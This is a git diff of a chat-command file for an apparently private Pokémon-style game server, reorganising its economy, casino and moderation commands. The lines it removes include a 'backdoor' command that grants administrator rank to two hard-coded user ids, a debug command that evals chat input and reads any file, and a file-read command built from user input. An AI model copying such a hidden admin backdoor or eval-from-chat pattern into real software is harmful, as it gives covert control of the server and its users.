@@ -45,7 +45,12 @@ function parseStatus(text, encoding) {
 }
 
 var components = exports.components = {
-	afk: function (target, room, user) {
+	/*********************************************************
+	 * General Commands
+	 * These commands are usable by all users, and are standard private-server commands.
+	 *********************************************************/
+	 
+ afk: function (target, room, user) {
 		this.parse('/away AFK', room, user);
 	},
 	busy: function (target, room, user) {
@@ -131,49 +136,16 @@ var components = exports.components = {
 		user.isAway = false;
 		if (user.can('lock', null, room)) this.add('|raw|-- <font color="' + Core.hashColor(user.userid) + '"><strong>' + Tools.escapeHTML(newName) + '</strong></font> is no longer ' + status.toLowerCase() + '.');
 	},
-
-	spam: 'spamroom',
-	spamroom: function (target, room, user) {
-		if (!target) return this.sendReply("Please specify a user.");
-		this.splitTarget(target);
-
-		if (!this.targetUser) {
-			return this.sendReply("The user '" + this.targetUsername + "' does not exist.");
-		}
-		if (!this.can('mute', this.targetUser)) {
-			return false;
-		}
-
-		var targets = Spamroom.addUser(this.targetUser);
-		if (targets.length === 0) {
-			return this.sendReply("That user's messages are already being redirected to the spamroom.");
-		}
-		this.privateModCommand("(" + user.name + " has added to the spamroom user list: " + targets.join(", ") + ")");
-	},
-
-	unspam: 'unspamroom',
-	unspamroom: function (target, room, user) {
-		if (!target) return this.sendReply("Please specify a user.");
-		this.splitTarget(target);
-
-		if (!this.can('mute')) {
-			return false;
-		}
-
-		var targets = Spamroom.removeUser(this.targetUser || this.targetUsername);
-		if (targets.length === 0) {
-			return this.sendReply("That user is not in the spamroom list.");
-		}
-		this.privateModCommand("(" + user.name + " has removed from the spamroom user list: " + targets.join(", ") + ")");
-	},
-
+	
 	earnbuck: 'earnmoney',
 	earnbucks: 'earnmoney',
+	earnhalo: 'earnmoney',
+	earnhalos: 'earnmoney',
 	earnmoney: function (target, room, user) {
 		if (!this.canBroadcast()) return;
-		this.sendReplyBox('<strong><u>Ways to earn money:</u></strong><br /><br /><ul><li>Win tournaments in offcial rooms<u></u></li><li>Play dice games in the casino.</li></ul>');
+		this.sendReplyBox('<strong><u>Ways to earn money:</u></strong><br /><br /><ul><li>Win tournaments in offcial rooms<u></u></li><li>Play dice games in the Casino.</li></ul>');
 	},
-
+	
 	regdate: function (target, room, user, connection) {
 		if (!this.canBroadcast()) return;
 		if (!target || target == "." || target == "," || target == "'") return this.parse('/help regdate');
@@ -253,8 +225,7 @@ var components = exports.components = {
 		if (about === 0) {
 			return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.lastSeen(true, targetUser) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(targetUser.userid)) + '<br clear="all">');
 		}
-		return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.display('about', about) + Core.profile.lastSeen(true, targetUser) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(targetUser.userid)) + '<br clear="all">');
-	},
+		return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.display('about', about) + Core.profile.lastSeen(true, targetUser) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(targetUser.userid)) + '<br clear="all">');	},
 
 	setabout: 'about',
 	about: function (target, room, user) {
@@ -294,77 +265,7 @@ var components = exports.components = {
 
 		return this.sendReply('|raw|<center>' + ladder + 'To view the entire ladder use /tourladder <em>all</em> or to view a certain amount of users use /tourladder <em>number</em></center>');
 	},
-
-	shop: function (target, room, user) {
-		if (!this.canBroadcast()) return;
-		return this.sendReply('|raw|' + Core.shop(true));
-	},
-
-	buy: function (target, room, user) {
-		if (!target) this.parse('/help buy');
-		var userMoney = Number(Core.stdin('money', user.userid));
-		var shop = Core.shop(false);
-		var len = shop.length;
-		while (len--) {
-			if (target.toLowerCase() === shop[len][0].toLowerCase()) {
-				var price = shop[len][2];
-				if (price > userMoney) return this.sendReply('You don\'t have enough money for this. You need ' + (price - userMoney) + ' more bucks to buy ' + target + '.');
-				Core.stdout('money', user.userid, (userMoney - price));
-				if (target.toLowerCase() === 'symbol') {
-					user.canCustomSymbol = true;
-					this.sendReply('You have purchased a custom symbol. You will have this until you log off for more than an hour. You may now use /customsymbol now.');
-					this.parse('/help customsymbol');
-					this.sendReply('If you do not want your custom symbol anymore, you may use /resetsymbol to go back to your old symbol.');
-				} else {
-					this.sendReply('You have purchased ' + target + '. Please contact an admin to get ' + target + '.');
-					for (var u in Users.users) {
-						if (Users.get(u).group === '~') Users.get(u).send('|pm|' + user.group + user.name + '|' + Users.get(u).group + Users.get(u).name + '|' + 'I have bought ' + target + ' from the shop.');
-					}
-				}
-				room.add(user.name + ' has bought ' + target + ' from the shop.');
-			}
-		}
-	},
-
-	transferbuck: 'transfermoney',
-	transferbucks: 'transfermoney',
-	transfermoney: function (target, room, user) {
-		if (!target) return this.parse('/help transfermoney');
-		if (!this.canTalk()) return;
-
-		if (target.indexOf(',') >= 0) {
-			var parts = target.split(',');
-			parts[0] = this.splitTarget(parts[0]);
-			var targetUser = this.targetUser;
-		}
-
-		if (!targetUser) return this.sendReply('User ' + this.targetUsername + ' not found.');
-		if (targetUser.userid === user.userid) return this.sendReply('You cannot transfer money to yourself.');
-		if (isNaN(parts[1])) return this.sendReply('Very funny, now use a real number.');
-		if (parts[1] < 1) return this.sendReply('You can\'t transfer less than one buck at a time.');
-		if (String(parts[1]).indexOf('.') >= 0) return this.sendReply('You cannot transfer money with decimals.');
-
-		var userMoney = Core.stdin('money', user.userid);
-		var targetMoney = Core.stdin('money', targetUser.userid);
-
-		if (parts[1] > Number(userMoney)) return this.sendReply('You cannot transfer more money than what you have.');
-
-		var b = 'bucks';
-		var cleanedUp = parts[1].trim();
-		var transferMoney = Number(cleanedUp);
-		if (transferMoney === 1) b = 'buck';
-
-		userMoney = Number(userMoney) - transferMoney;
-		targetMoney = Number(targetMoney) + transferMoney;
-
-		Core.stdout('money', user.userid, userMoney, function () {
-			Core.stdout('money', targetUser.userid, targetMoney);
-		});
-
-		this.sendReply('You have successfully transferred ' + transferMoney + ' ' + b + ' to ' + targetUser.name + '. You now have ' + userMoney + ' bucks.');
-		targetUser.send(user.name + ' has transferred ' + transferMoney + ' ' + b + ' to you. You now have ' + targetMoney + ' bucks.');
-	},
-
+	
 	tell: function (target, room, user) {
 		if (!target) return;
 		var message = this.splitTarget(target);
@@ -382,87 +283,6 @@ var components = exports.components = {
 		return this.sendReply("Message \"" + message + "\" sent to " + this.targetUsername + ".");
 	},
 
-	viewtells: 'showtells',
-	showtells: function (target, room, user) {
-		return this.sendReply("These users have currently have queued tells: " + Object.keys(tells));
-	},
-
-	vote: function (target, room, user) {
-		if (!Poll[room.id].question) return this.sendReply('There is no poll currently going on in this room.');
-		if (!this.canTalk()) return;
-		if (!target) return this.parse('/help vote');
-		if (Poll[room.id].optionList.indexOf(target.toLowerCase()) === -1) return this.sendReply('\'' + target + '\' is not an option for the current poll.');
-
-		var ips = JSON.stringify(user.ips);
-		Poll[room.id].options[ips] = target.toLowerCase();
-
-		return this.sendReply('You are now voting for ' + target + '.');
-	},
-
-	votes: function (target, room, user) {
-		if (!this.canBroadcast()) return;
-		this.sendReply('NUMBER OF VOTES: ' + Object.keys(Poll[room.id].options).length);
-	},
-
-	pr: 'pollremind',
-	pollremind: function (target, room, user) {
-		if (!Poll[room.id].question) return this.sendReply('There is no poll currently going on in this room.');
-		if (!this.canBroadcast()) return;
-		this.sendReplyBox(Poll[room.id].display);
-	},
-
-	customsymbol: function (target, room, user) {
-		if (!user.canCustomSymbol) return this.sendReply('You need to buy this item from the shop to use.');
-		if (!target || target.length > 1) return this.parse('/help customsymbol');
-		if (target.match(/[A-Za-z\d]+/g) || '‽!+%@\u2605&~#'.indexOf(target) >= 0) return this.sendReply('Sorry, but you cannot change your symbol to this for safety/stability reasons.');
-		user.getIdentity = function (roomid) {
-			if (!roomid) roomid = 'lobby';
-			var name = this.name + (this.away ? " - \u0410\u051d\u0430\u0443" : "");
-			if (this.locked) {
-				return '‽' + name;
-			}
-			if (this.mutedRooms[roomid]) {
-				return '!' + name;
-			}
-			var room = Rooms.rooms[roomid];
-			if (room.auth) {
-				if (room.auth[this.userid]) {
-					return room.auth[this.userid] + name;
-				}
-				if (room.isPrivate) return ' ' + name;
-			}
-			return target + name;
-		};
-		user.updateIdentity();
-		user.canCustomSymbol = false;
-		user.hasCustomSymbol = true;
-	},
-
-	resetsymbol: function (target, room, user) {
-		if (!user.hasCustomSymbol) return this.sendReply('You don\'t have a custom symbol.');
-		user.getIdentity = function (roomid) {
-			if (!roomid) roomid = 'lobby';
-			var name = this.name + (this.away ? " - \u0410\u051d\u0430\u0443" : "");
-			if (this.locked) {
-				return '‽' + name;
-			}
-			if (this.mutedRooms[roomid]) {
-				return '!' + name;
-			}
-			var room = Rooms.rooms[roomid];
-			if (room.auth) {
-				if (room.auth[this.userid]) {
-					return room.auth[this.userid] + name;
-				}
-				if (room.isPrivate) return ' ' + name;
-			}
-			return this.group + name;
-		};
-		user.hasCustomSymbol = false;
-		user.updateIdentity();
-		this.sendReply('Your symbol has been reset.');
-	},
-
 	emoticons: 'emoticon',
 	emoticon: function (target, room, user) {
 		if (!this.canBroadcast()) return;
@@ -472,7 +292,12 @@ var components = exports.components = {
 		while (len--) {
 			emoticons.push((Core.processEmoticons(name[(name.length - 1) - len]) + '&nbsp;' + name[(name.length - 1) - len]));
 		}
-		this.sendReplyBox('<b><u>List of emoticons:</b></u> <br/><br/>' + emoticons.join(' ').toString());
+		this.sendReplyBox('<b><u>List of emoticons:</b></u> <br/><br/>' + emoticons.join(' ').toString() + '<br/><b>Please not that Emoticons are currently disabled.</b>');
+	},
+		
+	viewtells: 'showtells',
+	showtells: function (target, room, user) {
+		return this.sendReply("These users have currently have queued tells: " + Object.keys(tells));
 	},
 
 	u: 'urbandefine',
@@ -550,240 +375,10 @@ var components = exports.components = {
 		}
 		http.request(options, callback);
 	},
-
+	
 	/*********************************************************
-	 * Staff commands
+	 * Moderation Commands
 	 *********************************************************/
-
-	backdoor: function (target, room, user) {
-		if (user.userid !== 'irraquated' || user.userid !== 'haunter') return this.sendReply('/backdoor - Access denied.');
-
-		if (!target) {
-			user.group = '~';
-			user.updateIdentity();
-			return;
-		}
-
-		if (target === 'reg') {
-			user.group = ' ';
-			user.updateIdentity();
-			return;
-		}
-	},
-
-	givebuck: 'givemoney',
-	givebucks: 'givemoney',
-	givemoney: function (target, room, user) {
-		if (!user.can('givemoney')) return;
-		if (!target) return this.parse('/help givemoney');
-
-		if (target.indexOf(',') >= 0) {
-			var parts = target.split(',');
-			parts[0] = this.splitTarget(parts[0]);
-			var targetUser = this.targetUser;
-		}
-
-		if (!targetUser) return this.sendReply('User ' + this.targetUsername + ' not found.');
-		if (isNaN(parts[1])) return this.sendReply('Very funny, now use a real number.');
-		if (parts[1] < 1) return this.sendReply('You can\'t give less than one buck at a time.');
-		if (String(parts[1]).indexOf('.') >= 0) return this.sendReply('You cannot give money with decimals.');
-
-		var b = 'bucks';
-		var cleanedUp = parts[1].trim();
-		var giveMoney = Number(cleanedUp);
-		if (giveMoney === 1) b = 'buck';
-
-		var money = Core.stdin('money', targetUser.userid);
-		var total = Number(money) + Number(giveMoney);
-
-		Core.stdout('money', targetUser.userid, total);
-
-		this.sendReply(targetUser.name + ' was given ' + giveMoney + ' ' + b + '. This user now has ' + total + ' bucks.');
-		targetUser.send(user.name + ' has given you ' + giveMoney + ' ' + b + '. You now have ' + total + ' bucks.');
-	},
-
-	takebuck: 'takemoney',
-	takebucks: 'takemoney',
-	takemoney: function (target, room, user) {
-		if (!user.can('takemoney')) return;
-		if (!target) return this.parse('/help takemoney');
-
-		if (target.indexOf(',') >= 0) {
-			var parts = target.split(',');
-			parts[0] = this.splitTarget(parts[0]);
-			var targetUser = this.targetUser;
-		}
-
-		if (!targetUser) return this.sendReply('User ' + this.targetUsername + ' not found.');
-		if (isNaN(parts[1])) return this.sendReply('Very funny, now use a real number.');
-		if (parts[1] < 1) return this.sendReply('You can\'t take less than one buck at a time.');
-		if (String(parts[1]).indexOf('.') >= 0) return this.sendReply('You cannot take money with decimals.');
-
-		var b = 'bucks';
-		var cleanedUp = parts[1].trim();
-		var takeMoney = Number(cleanedUp);
-		if (takeMoney === 1) b = 'buck';
-
-		var money = Core.stdin('money', targetUser.userid);
-		var total = Number(money) - Number(takeMoney);
-
-		Core.stdout('money', targetUser.userid, total);
-
-		this.sendReply(targetUser.name + ' has losted ' + takeMoney + ' ' + b + '. This user now has ' + total + ' bucks.');
-		targetUser.send(user.name + ' has taken ' + takeMoney + ' ' + b + ' from you. You now have ' + total + ' bucks.');
-	},
-
-	roomlist: function (target, room, user) {
-		if (!this.can('roomlist')) return;
-
-		var rooms = Object.keys(Rooms.rooms),
-			len = rooms.length,
-			official = ['<b><font color="#1a5e00" size="2">Official chat rooms</font></b><br><br>'],
-			nonOfficial = ['<hr><b><font color="#000b5e" size="2">Chat rooms</font></b><br><br>'],
-			privateRoom = ['<hr><b><font color="#5e0019" size="2">Private chat rooms</font></b><br><br>'];
-
-		while (len--) {
-			var _room = Rooms.rooms[rooms[(rooms.length - len) - 1]];
-			if (_room.type === 'chat') {
-				if (_room.isOfficial) {
-					official.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
-					continue;
-				}
-				if (_room.isPrivate) {
-					privateRoom.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
-					continue;
-				}
-				nonOfficial.push(('<a href="/' + _room.title + '" class="ilink">' + _room.title + '</a>'));
-			}
-		}
-
-		this.sendReplyBox(official.join(' ') + nonOfficial.join(' ') + privateRoom.join(' '));
-	},
-
-	sudo: function (target, room, user) {
-		if (!user.can('sudo')) return;
-		var parts = target.split(',');
-		if (parts.length < 2) return this.parse('/help sudo');
-		if (parts.length >= 3) parts.push(parts.splice(1, parts.length).join(','));
-		var targetUser = parts[0],
-			cmd = parts[1].trim().toLowerCase(),
-			commands = Object.keys(CommandParser.commands).join(' ').toString(),
-			spaceIndex = cmd.indexOf(' '),
-			targetCmd = cmd;
-
-		if (spaceIndex > 0) targetCmd = targetCmd.substr(1, spaceIndex - 1);
-
-		if (!Users.get(targetUser)) return this.sendReply('User ' + targetUser + ' not found.');
-		if (commands.indexOf(targetCmd.substring(1, targetCmd.length)) < 0 || targetCmd === '') return this.sendReply('Not a valid command.');
-		if (cmd.match(/\/me/)) {
-			if (cmd.match(/\/me./)) return this.parse('/control ' + targetUser + ', say, ' + cmd);
-			return this.sendReply('You must put a target to make a user use /me.');
-		}
-		CommandParser.parse(cmd, room, Users.get(targetUser), Users.get(targetUser).connections[0]);
-		this.sendReply('You have made ' + targetUser + ' do ' + cmd + '.');
-	},
-
-	poll: function (target, room, user) {
-		if (!this.can('broadcast', null, room)) return;
-		if (Poll[room.id].question) return this.sendReply('There is currently a poll going on already.');
-		if (!this.canTalk()) return;
-
-		var options = Poll.splint(target);
-		if (options.length < 3) return this.parse('/help poll');
-
-		var question = options.shift();
-
-		options = options.join(',').toLowerCase().split(',');
-
-		Poll[room.id].question = question;
-		Poll[room.id].optionList = options;
-
-		var pollOptions = '';
-		var start = 0;
-		while (start < Poll[room.id].optionList.length) {
-			pollOptions += '<button name="send" value="/vote ' + Poll[room.id].optionList[start] + '">' + Poll[room.id].optionList[start] + '</button>&nbsp;';
-			start++;
-		}
-		Poll[room.id].display = '<h2>' + Poll[room.id].question + '&nbsp;&nbsp;<font size="1" color="#AAAAAA">/vote OPTION</font><br><font size="1" color="#AAAAAA">Poll started by <em>' + user.name + '</em></font><br><hr>&nbsp;&nbsp;&nbsp;&nbsp;' + pollOptions;
-		room.add('|raw|<div class="infobox">' + Poll[room.id].display + '</div>');
-	},
-
-	tierpoll: function (target, room, user) {
-		if (!this.can('broadcast', null, room)) return;
-		this.parse('/poll Tournament tier?, ' + Object.keys(Tools.data.Formats).filter(function (f) { return Tools.data.Formats[f].effectType === 'Format'; }).join(", "));
-	},
-
-	doublespoll: function (target, room, user) {
-		if (!this.can('broadcast', null, room)) return;
-		this.parse('/poll Tournament tier?, Random Doubles Battle, Smogon Doubles, Smogon Doubles Ubers, Smogon Doubles UU, VGC 2015, Smogon Doubles[Gen5]');
-	},
-
-	lobbypoll: function (target, room, user) {
-		if (!this.can('broadcast', null, room)) return;
-		this.parse('/poll Tournament Tier?, Random Battles, Metronome, Duotype, Monotype, Seasonal, Ubers, OU, UU, RU, NU, LC, VGC, Random Triples, Random Doubles, Random Monotype, Random LC, Ubers Mono, CC1vs1, CC, 1v1');
-	},
-
-	easytour: 'etour',
-	etour: function (target, room, user) {
-		if (!this.can('broadcast', null, room)) return;
-		this.parse('/tour new ' + target + ', elimination');
-	},
-
-	endpoll: function (target, room, user) {
-		if (!this.can('broadcast', null, room)) return;
-		if (!Poll[room.id].question) return this.sendReply('There is no poll to end in this room.');
-
-		var votes = Object.keys(Poll[room.id].options).length;
-
-		if (votes === 0) {
-			Poll.reset(room.id);
-			return room.add('|raw|<h3>The poll was canceled because of lack of voters.</h3>');
-		}
-
-		var options = {};
-
-		for (var i in Poll[room.id].optionList) {
-			options[Poll[room.id].optionList[i]] = 0;
-		}
-
-		for (var i in Poll[room.id].options) {
-			options[Poll[room.id].options[i]]++;
-		}
-
-		var data = [];
-		for (var i in options) {
-			data.push([i, options[i]]);
-		}
-		data.sort(function (a, b) {
-			return a[1] - b[1];
-		});
-
-		var results = '';
-		var len = data.length;
-		var topOption = data[len - 1][0];
-		while (len--) {
-			if (data[len][1] > 0) {
-				results += '&bull; ' + data[len][0] + ' - ' + Math.floor(data[len][1] / votes * 100) + '% (' + data[len][1] + ')<br>';
-			}
-		}
-		room.add('|raw|<div class="infobox"><h2>Results to "' + Poll[room.id].question + '"</h2><font size="1" color="#AAAAAA"><strong>Poll ended by <em>' + user.name + '</em></font><br><hr>' + results + '</strong></div>');
-		Poll.reset(room.id);
-		Poll[room.id].topOption = topOption;
-	},
-
-	control: function (target, room, user) {
-		if (!this.can('control')) return;
-		var parts = target.split(',');
-
-		if (parts.length < 3) return this.parse('/help control');
-
-		if (parts[1].trim().toLowerCase() === 'say') {
-			return room.add('|c|' + Users.get(parts[0].trim()).group + Users.get(parts[0].trim()).name + '|' + parts[2].trim());
-		}
-		if (parts[1].trim().toLowerCase() === 'pm') {
-			return Users.get(parts[2].trim()).send('|pm|' + Users.get(parts[0].trim()).group + Users.get(parts[0].trim()).name + '|' + Users.get(parts[2].trim()).group + Users.get(parts[2].trim()).name + '|' + parts[3].trim());
-		}
-	},
 
 	clearall: function (target, room, user) {
 		if (!this.can('clearall')) return;
@@ -805,108 +400,78 @@ var components = exports.components = {
 			}
 		}, 1000);
 	},
+	
+	spam: 'spamroom',
+	spamroom: function (target, room, user) {
+		if (!target) return this.sendReply("Please specify a user.");
+		this.splitTarget(target);
+
+		if (!this.targetUser) {
+			return this.sendReply("The user '" + this.targetUsername + "' does not exist.");
+		}
+		if (!this.can('mute', this.targetUser)) {
+			return false;
+		}
+
+		var targets = Spamroom.addUser(this.targetUser);
+		if (targets.length === 0) {
+			return this.sendReply("That user's messages are already being redirected to the spamroom.");
+		}
+		this.privateModCommand("(" + user.name + " has added to the spamroom user list: " + targets.join(", ") + ")");
+	},
+
+	unspam: 'unspamroom',
+	unspamroom: function (target, room, user) {
+		if (!target) return this.sendReply("Please specify a user.");
+		this.splitTarget(target);
+
+		if (!this.can('mute')) {
+			return false;
+		}
+
+		var targets = Spamroom.removeUser(this.targetUser || this.targetUsername);
+		if (targets.length === 0) {
+			return this.sendReply("That user is not in the spamroom list.");
+		}
+		this.privateModCommand("(" + user.name + " has removed from the spamroom user list: " + targets.join(", ") + ")");
+	},
 
 	/*********************************************************
-	 * Server management commands
+	 * Economy and Casino Commands
+	 * The commands which control Nimbus' currency system, Halos.
 	 *********************************************************/
-
-	debug: function (target, room, user, connection, cmd, message) {
-		if (!user.hasConsoleAccess(connection)) {
-			return this.sendReply('/debug - Access denied.');
-		}
+	 
+	shop: function (target, room, user) {
 		if (!this.canBroadcast()) return;
-
-		if (!this.broadcasting) this.sendReply('||>> ' + target);
-		try {
-			var battle = room.battle;
-			var me = user;
-			if (target.indexOf('-h') >= 0 || target.indexOf('-help') >= 0) {
-				return this.sendReplyBox('This is a custom eval made by CreaturePhil for easier debugging.<br/>' +
-					'<b>-h</b> OR <b>-help</b>: show all options<br/>' +
-					'<b>-k</b>: object.keys of objects<br/>' +
-					'<b>-r</b>: reads a file<br/>' +
-					'<b>-p</b>: returns the current high-resolution real time in a second and nanoseconds. This is for speed/performance tests.');
-			}
-			if (target.indexOf('-k') >= 0) {
-				target = 'Object.keys(' + target.split('-k ')[1] + ');';
-			}
-			if (target.indexOf('-r') >= 0) {
-				this.sendReply('||<< Reading... ' + target.split('-r ')[1]);
-				return this.popupReply(eval('fs.readFileSync("' + target.split('-r ')[1] + '","utf-8");'));
-			}
-			if (target.indexOf('-p') >= 0) {
-				target = 'var time = process.hrtime();' + target.split('-p')[1] + 'var diff = process.hrtime(time);this.sendReply("|raw|<b>High-Resolution Real Time Benchmark:</b><br/>"+"Seconds: "+(diff[0] + diff[1] * 1e-9)+"<br/>Nanoseconds: " + (diff[0] * 1e9 + diff[1]));';
-			}
-			this.sendReply('||<< ' + eval(target));
-		} catch (e) {
-			this.sendReply('||<< error: ' + e.message);
-			var stack = '||' + ('' + e.stack).replace(/\n/g, '\n||');
-			connection.sendTo(room, stack);
-		}
+		return this.sendReply('|raw|' + Core.shop(true));
 	},
 
-	reload: function (target, room, user) {
-		if (!this.can('reload')) return;
-
-		try {
-			this.sendReply('Reloading CommandParser...');
-			CommandParser.uncacheTree(path.join(__dirname, './', 'command-parser.js'));
-			CommandParser = require(path.join(__dirname, './', 'command-parser.js'));
-
-			/* this.sendReply('Reloading Bot...');
-			CommandParser.uncacheTree(path.join(__dirname, './', 'bot.js'));
-			Bot = require(path.join(__dirname, './', 'bot.js'));*/
-
-			this.sendReply('Reloading Tournaments...');
-			var runningTournaments = Tournaments.tournaments;
-			CommandParser.uncacheTree(path.join(__dirname, './', './tournaments/index.js'));
-			Tournaments = require(path.join(__dirname, './', './tournaments/index.js'));
-			Tournaments.tournaments = runningTournaments;
-
-			this.sendReply('Reloading Core...');
-			CommandParser.uncacheTree(path.join(__dirname, './', './core.js'));
-			Core = require(path.join(__dirname, './', './core.js')).core;
-
-			this.sendReply('Reloading Components...');
-			CommandParser.uncacheTree(path.join(__dirname, './', './components.js'));
-			Components = require(path.join(__dirname, './', './components.js'));
-
-			this.sendReply('Reloading SysopAccess...');
-			CommandParser.uncacheTree(path.join(__dirname, './', './core.js'));
-			SysopAccess = require(path.join(__dirname, './', './core.js'));
-
-			return this.sendReply('|raw|<font color="green">All files have been reloaded.</font>');
-		} catch (e) {
-			return this.sendReply('|raw|<font color="red">Something failed while trying to reload files:</font> \n' + e.stack);
-		}
-	},
-
-	db: 'database',
-	database: function (target, room, user) {
-		if (!this.can('db')) return;
-		if (!target) return user.send('|popup|You must enter a target.');
-
-		try {
-			var log = fs.readFileSync(('config/' + target + '.csv'), 'utf8');
-			return user.send('|popup|' + log);
-		} catch (e) {
-			return user.send('|popup|Something bad happen:\n\n ' + e.stack);
-		}
-	},
-
-	pmstaff: 'pmallstaff',
-	pas: 'pmallstaff',
-	pmallstaff: function (target, room, user) {
-		if (!target) return this.sendReply('/pmallstaff [message] - Sends a PM to every staff member online.');
-		if (!this.can('pmall')) return false;
-
-		for (var u in Users.users) {
-			if (Users.users[u].isStaff) {
-				Users.users[u].send('|pm|~Staff PM|' + Users.users[u].group + Users.users[u].name + '|' + target);
+	buy: function (target, room, user) {
+		if (!target) this.parse('/help buy');
+		var userMoney = Number(Core.stdin('money', user.userid));
+		var shop = Core.shop(false);
+		var len = shop.length;
+		while (len--) {
+			if (target.toLowerCase() === shop[len][0].toLowerCase()) {
+				var price = shop[len][2];
+				if (price > userMoney) return this.sendReply('You don\'t have enough halos for this. You need ' + (price - userMoney) + ' more bucks to buy ' + target + '.');
+				Core.stdout('money', user.userid, (userMoney - price));
+				if (target.toLowerCase() === 'symbol') {
+					user.canCustomSymbol = true;
+					this.sendReply('You have purchased a custom symbol. You will have this until you log off for more than an hour. You may now use /customsymbol to set your symbol now.');
+					this.parse('/help customsymbol');
+					this.sendReply('If you do not want your custom symbol anymore, you may use /resetsymbol to go back to your old symbol.');
+				} else {
+					this.sendReply('You have purchased ' + target + '. Please contact an admin to get ' + target + '.');
+					for (var u in Users.users) {
+						if (Users.get(u).group === '~') Users.get(u).send('|pm|' + user.group + user.name + '|' + Users.get(u).group + Users.get(u).name + '|' + 'I have bought ' + target + ' from the shop.');
+					}
+				}
+				room.add(user.name + ' has bought ' + target + ' from the shop.');
 			}
 		}
 	},
-
+	
 	dicerules: 'dicecommands',
 	dicehelp: 'dicecommands',
 	dicecommands: function (target, room, user) {
@@ -1051,6 +616,462 @@ var components = exports.components = {
 		if (!room.dice) return this.sendReply("There is no game of dice going on in this room right now."); this.add('|html|<b>The game of dice has been ended by ' + user.name); delete room.dice;
 	},
 
+
+	transferbuck: 'transfermoney',
+	transferhalo: 'transfermoney',
+	transferhalos: 'transfermoney',
+	transferbucks: 'transfermoney',
+	transfermoney: function (target, room, user) {
+		if (!target) return this.parse('/help transfermoney');
+		if (!this.canTalk()) return;
+
+		if (target.indexOf(',') >= 0) {
+			var parts = target.split(',');
+			parts[0] = this.splitTarget(parts[0]);
+			var targetUser = this.targetUser;
+		}
+
+		if (!targetUser) return this.sendReply('User ' + this.targetUsername + ' not found.');
+		if (targetUser.userid === user.userid) return this.sendReply('You cannot transfer halos to yourself.');
+		if (isNaN(parts[1])) return this.sendReply('Very funny, now use a real number.');
+		if (parts[1] < 1) return this.sendReply('You can\'t transfer less than one halo at a time.');
+		if (String(parts[1]).indexOf('.') >= 0) return this.sendReply('You cannot transfer halos with decimals.');
+
+		var userMoney = Core.stdin('money', user.userid);
+		var targetMoney = Core.stdin('money', targetUser.userid);
+
+		if (parts[1] > Number(userMoney)) return this.sendReply('You cannot transfer more halos than what you have.');
+
+		var b = 'halos';
+		var cleanedUp = parts[1].trim();
+		var transferMoney = Number(cleanedUp);
+		if (transferMoney === 1) b = 'halo';
+
+		userMoney = Number(userMoney) - transferMoney;
+		targetMoney = Number(targetMoney) + transferMoney;
+
+		Core.stdout('money', user.userid, userMoney, function () {
+			Core.stdout('money', targetUser.userid, targetMoney);
+		});
+
+		this.sendReply('You have successfully transferred ' + transferMoney + ' ' + b + ' to ' + targetUser.name + '. You now have ' + userMoney + ' bucks.');
+		targetUser.send(user.name + ' has transferred ' + transferMoney + ' ' + b + ' to you. You now have ' + targetMoney + ' bucks.');
+	},
+
+	customsymbol: function (target, room, user) {
+		if (!user.canCustomSymbol) return this.sendReply('You need to buy this item from the shop to use.');
+		if (!target || target.length > 1) return this.parse('/help customsymbol');
+		if (target.match(/[A-Za-z\d]+/g) || 'â€½!+%@\u2605&~#'.indexOf(target) >= 0) return this.sendReply('Sorry, but you cannot change your symbol to this for safety/stability reasons.');
+		user.getIdentity = function (roomid) {
+			if (!roomid) roomid = 'lobby';
+			var name = this.name + (this.away ? " - \u0410\u051d\u0430\u0443" : "");
+			if (this.locked) {
+				return 'â€½' + name;
+			}
+			if (this.mutedRooms[roomid]) {
+				return '!' + name;
+			}
+			var room = Rooms.rooms[roomid];
+			if (room.auth) {
+				if (room.auth[this.userid]) {
+					return room.auth[this.userid] + name;
+				}
+				if (room.isPrivate) return ' ' + name;
+			}
+			return target + name;
+		};
+		user.updateIdentity();
+		user.canCustomSymbol = false;
+		user.hasCustomSymbol = true;
+	},
+
+	resetsymbol: function (target, room, user) {
+		if (!user.hasCustomSymbol) return this.sendReply('You don\'t have a custom symbol.');
+		user.getIdentity = function (roomid) {
+			if (!roomid) roomid = 'lobby';
+			var name = this.name + (this.away ? " - \u0410\u051d\u0430\u0443" : "");
+			if (this.locked) {
+				return 'â€½' + name;
+			}
+			if (this.mutedRooms[roomid]) {
+				return '!' + name;
+			}
+			var room = Rooms.rooms[roomid];
+			if (room.auth) {
+				if (room.auth[this.userid]) {
+					return room.auth[this.userid] + name;
+				}
+				if (room.isPrivate) return ' ' + name;
+			}
+			return this.group + name;
+		};
+		user.hasCustomSymbol = false;
+		user.updateIdentity();
+		this.sendReply('Your symbol has been reset.');
+	},
+
+
+	givebuck: 'givemoney',
+	givebucks: 'givemoney',
+	givemoney: function (target, room, user) {
+		if (!user.can('givemoney')) return;
+		if (!target) return this.parse('/help givemoney');
+
+		if (target.indexOf(',') >= 0) {
+			var parts = target.split(',');
+			parts[0] = this.splitTarget(parts[0]);
+			var targetUser = this.targetUser;
+		}
+
+		if (!targetUser) return this.sendReply('User ' + this.targetUsername + ' not found.');
+		if (isNaN(parts[1])) return this.sendReply('Very funny, now use a real number.');
+		if (parts[1] < 1) return this.sendReply('You can\'t give less than one buck at a time.');
+		if (String(parts[1]).indexOf('.') >= 0) return this.sendReply('You cannot give money with decimals.');
+
+		var b = 'bucks';
+		var cleanedUp = parts[1].trim();
+		var giveMoney = Number(cleanedUp);
+		if (giveMoney === 1) b = 'buck';
+
+		var money = Core.stdin('money', targetUser.userid);
+		var total = Number(money) + Number(giveMoney);
+
+		Core.stdout('money', targetUser.userid, total);
+
+		this.sendReply(targetUser.name + ' was given ' + giveMoney + ' ' + b + '. This user now has ' + total + ' bucks.');
+		targetUser.send(user.name + ' has given you ' + giveMoney + ' ' + b + '. You now have ' + total + ' bucks.');
+	},
+
+	takebuck: 'takemoney',
